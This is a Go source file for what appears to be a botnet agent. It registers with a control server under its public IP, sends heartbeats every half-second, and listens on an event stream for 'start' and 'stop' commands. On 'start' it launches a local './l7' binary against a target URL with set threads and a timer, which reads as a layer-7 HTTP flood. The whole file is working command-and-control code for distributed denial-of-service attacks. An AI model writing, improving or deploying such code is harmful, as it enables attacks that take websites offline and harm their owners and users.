// agent.go
package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

type Command struct {
	Action     string `json:"action"`
	URL        string `json:"url"`
	Threads    int    `json:"threads"`
	Timer      int    `json:"timer"`
	CustomHost string `json:"custom_host"`
}

var (
	mu      sync.Mutex
	status  = "Ready"
	currCmd *exec.Cmd
	randSrc = rand.New(rand.NewSource(time.Now().UnixNano()))

	httpClient = &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig:   &tls.Config{InsecureSkipVerify: false},
			ForceAttemptHTTP2: false,
		},
	}
)

func reportStatus(controlURL, agentID string) {
	mu.Lock()
	s := status
	mu.Unlock()

	payload, _ := json.Marshal(map[string]string{"agentID": agentID, "status": s})
	req, _ := http.NewRequest(http.MethodPost, controlURL+"/agent-status", bytes.NewBuffer(payload))
	req.Header.Set("Content-Type", "application/json")

	if resp, err := httpClient.Do(req); err != nil {
		log.Printf("[AGENT] status POST error: %v", err)
	} else {
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}
}

func executeL7(controlURL, agentID, url string, threads, timer int, customHost string) {
	// kill existing
	mu.Lock()
	if currCmd != nil && currCmd.Process != nil {
		currCmd.Process.Kill()
	}
	mu.Unlock()

	// set status
	mu.Lock()
	status = "Sending"
	mu.Unlock()
	reportStatus(controlURL, agentID)

	// prepare context
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timer)*time.Second)
	defer cancel()

	args := []string{url, strconv.Itoa(threads), strconv.Itoa(timer)}
	if customHost != "" {
		args = append(args, customHost)
	}
	cmd := exec.CommandContext(ctx, "./l7", args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Start(); err != nil {
		log.Printf("[AGENT] l7 start error: %v", err)
		mu.Lock()
		status = "Error"
		mu.Unlock()
		reportStatus(controlURL, agentID)
		return
	}

	mu.Lock()
	currCmd = cmd
	mu.Unlock()

	// wait for completion or timeout
	if err := cmd.Wait(); err != nil && ctx.Err() == nil {
		log.Printf("[AGENT] l7 execution error: %v", err)
	}

	mu.Lock()
	status = "Ready"
	mu.Unlock()
	reportStatus(controlURL, agentID)
}

func listenForCommands(controlURL, agentID string) {
	backoff := 500 * time.Millisecond
	for {
		sseURL := fmt.Sprintf("%s/events?agentID=%s", controlURL, agentID)
		dialer := &net.Dialer{Timeout: 10 * time.Second}
		tr := &http.Transport{
			TLSClientConfig:   &tls.Config{InsecureSkipVerify: false},
			ForceAttemptHTTP2: false,
			DialContext:       dialer.DialContext,
		}
		client := &http.Client{Transport: tr}

		req, _ := http.NewRequest(http.MethodGet, sseURL, nil)
		req.Header.Set("Accept", "text/event-stream")

		resp, err := client.Do(req)
		if err != nil {
			j := time.Duration(randSrc.Int63n(int64(backoff / 5)))
			time.Sleep(backoff + j)
			backoff *= 2
			if backoff > 10*time.Second {
				backoff = 10 * time.Second
			}
			continue
		}
		if resp.StatusCode != http.StatusOK {
			resp.Body.Close()
			time.Sleep(backoff)
			continue
		}
		backoff = 500 * time.Millisecond

		reader := bufio.NewReader(resp.Body)
		for {
			line, err := reader.ReadString('\n')
			if err != nil {
				resp.Body.Close()
				break
			}
			line = strings.TrimSpace(line)
			if strings.HasPrefix(line, "event: command-enqueued") {
				// read until data:
				for {
					dataLine, err2 := reader.ReadString('\n')
					if err2 != nil {
						resp.Body.Close()
						break
					}
					if strings.HasPrefix(strings.TrimSpace(dataLine), "data: ") {
						var cmd Command
						if err := json.Unmarshal([]byte(strings.TrimSpace(dataLine)[6:]), &cmd); err == nil {
							switch cmd.Action {
							case "start":
								go executeL7(controlURL, agentID, cmd.URL, cmd.Threads, cmd.Timer, cmd.CustomHost)
							case "stop":
								mu.Lock()
								if currCmd != nil && currCmd.Process != nil {
									currCmd.Process.Kill()
								}
								status = "Ready"
								mu.Unlock()
								reportStatus(controlURL, agentID)
							}
						}
						break
					}
				}
			}
		}
	}
}

func getPublicIP() (string, error) {
	resp, err := httpClient.Get("https://api.ipify.org?format=text")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	ip := strings.TrimSpace(string(b))
	if ip == "" {
		return "", fmt.Errorf("empty IP")
	}
	return ip, nil
}

func main() {
	server := flag.String("server", "http://localhost:8080", "control server URL")
	flag.Parse()

	ip, err := getPublicIP()
	if err != nil {
		log.Fatalf("[AGENT] cannot get public IP: %v", err)
	}
	agentID := ip
	controlURL := *server

	log.Printf("[AGENT] %s starting → %s", agentID, controlURL)

	// cleanup on exit
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigCh
		mu.Lock()
		if currCmd != nil && currCmd.Process != nil {
			currCmd.Process.Kill()
		}
		mu.Unlock()
		os.Exit(0)
	}()

	// initial heartbeat
	reportStatus(controlURL, agentID)
	// command loop
	go listenForCommands(controlURL, agentID)
	// periodic heartbeat
	go func() {
		t := time.NewTicker(500 * time.Millisecond)
		defer t.Stop()
		for range t.C {
			reportStatus(controlURL, agentID)
		}
	}()

	select {}
}
